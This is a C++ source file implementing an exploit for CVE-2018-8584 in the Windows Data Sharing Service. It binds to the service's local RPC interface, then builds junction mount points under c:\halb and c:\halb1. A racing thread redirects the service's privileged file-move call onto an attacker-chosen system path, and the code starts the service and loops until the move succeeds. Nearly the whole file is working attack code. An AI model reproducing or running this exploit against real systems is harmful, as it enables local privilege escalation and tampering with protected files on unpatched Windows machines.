#include "stdafx.h"
#include "rpc_h.h"
#include "FileOpLock.h"
#include "ReparsePoint.h"
#include <string>
#include <sddl.h>
#include <iostream>

#pragma comment(lib, "rpcrt4.lib")

extern "C"
{
	wchar_t* GetTargetDirectoryWithoutSlashW(wchar_t* const destination);
	wchar_t* GetTargetFilenameW(wchar_t* const destination);
	wchar_t* GetTargetPathW(wchar_t* const destination);
}

bool triggered = false;
RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW(L"bf4dc912-e52f-4904-8ebe-9317c1bdd497", L"ncalrpc",
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}




DWORD WINAPI MyThreadFunction(LPVOID lpParam);


DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	HANDLE hFile;
	FileOpLock* halb = nullptr;
	do
	{
		wchar_t target_filename[1024];
		wchar_t target_directory[1024];
		wchar_t tmp[1000] = L"";
		GetTargetFilenameW(target_filename);
		GetTargetDirectoryWithoutSlashW(target_directory);
		wcscat(tmp, L"c:\\halb\\");
		wcscat(tmp, target_filename);
		hFile = CreateFileW(tmp, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	} while (hFile == INVALID_HANDLE_VALUE);
	ReparsePoint::CreateMountPoint(L"c:\\halb1", target_directory, L"");
	CloseHandle(hFile);
	return 0;
}


void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);
	if (status != RPC_S_OK)
	{
		return;
	}
	RpcTryExcept
	{
		wchar_t target_filename[1024];
		wchar_t tmp[1000] = L"";
		GetTargetFilenameW(target_filename);
		wcscat(tmp, L"c:\\halb1\\");
		wcscat(tmp, target_filename);
		Proc8_RpcDSSMoveFromSharedFile(handle,L"token", tmp);
	}
		RpcExcept(1)
	{
		ULONG ulCode = RpcExceptionCode();

	}
	RpcEndExcept
}

void runme() {
	CreateDirectoryW(L"c:\\halb1", NULL);
	CreateDirectoryW(L"c:\\halb", NULL);
	ReparsePoint::CreateMountPoint(L"c:\\halb1", L"c:\\halb", L"");
	HANDLE mThread = CreateThread(
		NULL,                   // default security attributes
		0,                      // use default stack size  
		MyThreadFunction,       // thread function name
		NULL,          // argument to thread function 
		0,                      // use default creation flags 
		NULL);   // returns the thread identifier 
	SetThreadPriority(mThread, THREAD_PRIORITY_TIME_CRITICAL);
	Sleep(1000);
	RunExploit();
	Sleep(1000);
}

extern "C"
{
	void CVE_2018_8584()
	{
		wchar_t target_filepath[1024];
		HANDLE hFile;
		GetTargetPathW(target_filepath);
		system("net start \"Data Sharing Service\""); // TODO: start service via code to avoid spawning childprocess
		Sleep(1001);
		do
		{
			runme();
			hFile = CreateFileW(target_filepath,
				GENERIC_READ,
				FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			CloseHandle(hFile);
		} while (hFile != INVALID_HANDLE_VALUE);
	}
}

